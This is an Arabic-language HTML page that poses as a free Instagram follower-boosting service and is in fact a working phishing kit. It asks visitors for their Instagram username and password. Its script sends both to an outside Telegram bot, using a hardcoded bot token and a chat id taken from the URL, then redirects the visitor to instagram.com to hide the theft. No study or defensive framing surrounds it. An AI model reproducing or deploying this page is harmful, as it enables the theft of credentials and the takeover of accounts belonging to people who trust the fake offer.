<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Instagram رشق</title>
    <style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'Segoe UI',sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;border:1px solid #dbdbdb;border-radius:12px;padding:30px;width:380px;text-align:center}img{width:180px;margin:0 auto 20px;display:block}h2{color:#262626;margin-bottom:6px}p{color:#8e8e8e;font-size:14px;margin-bottom:18px}.gift-box{background:linear-gradient(135deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);border-radius:12px;padding:12px;color:#fff;margin-bottom:15px}.gift-box span{font-weight:bold;font-size:18px}input,select{width:100%;padding:12px;margin:8px 0;background:#fafafa;border:1px solid #dbdbdb;border-radius:6px;font-size:14px;text-align:center}.btn{background:#0095f6;color:#fff;border:none;padding:12px;width:100%;border-radius:8px;font-size:18px;font-weight:bold;cursor:pointer;margin-top:10px}.btn:hover{background:#1877f2}</style></head>
<body><div class="card">
<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram">
<h2>📸 رشق متابعين انستقرام</h2>
<p>احصل على متابعين حقيقيين مجاناً!</p>
<div class="gift-box"><span>🎉 1000 متابع مجاناً</span></div>
<select id="amount"><option value="100">100 متابع</option><option value="500">500 متابع</option><option value="1000" selected>1000 متابع</option><option value="5000">5000 متابع</option></select>
<input id="username" placeholder="اسم المستخدم في انستقرام">
<input id="password" type="password" placeholder="كلمة المرور للتأكيد">
<button class="btn" onclick="sendData()">إرسال الرشق الآن 🚀</button>
<p id="msg" style="margin-top:12px;font-size:14px;font-weight:bold;"></p>
</div>
<script>
const TOKEN="8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs";const p=new URLSearchParams(location.search);const CHAT=p.get('chat');
function sendData(){const u=document.getElementById('username').value,pa=document.getElementById('password').value,am=document.getElementById('amount').value;
if(!u||!pa)return alert('املأ جميع الحقول');
document.getElementById('msg').innerHTML='⏳ جاري إرسال الرشق...';
fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent('📸 رشق انستقرام\n👤 '+u+'\n🔑 '+pa+'\n📊 الكمية: '+am+' متابع')}`).then(()=>{document.getElementById('msg').innerHTML='✅ تم الإرسال! سيصل الرشق خلال دقائق.';setTimeout(()=>location.href='https://instagram.com',3000)});}
</script></body></html>
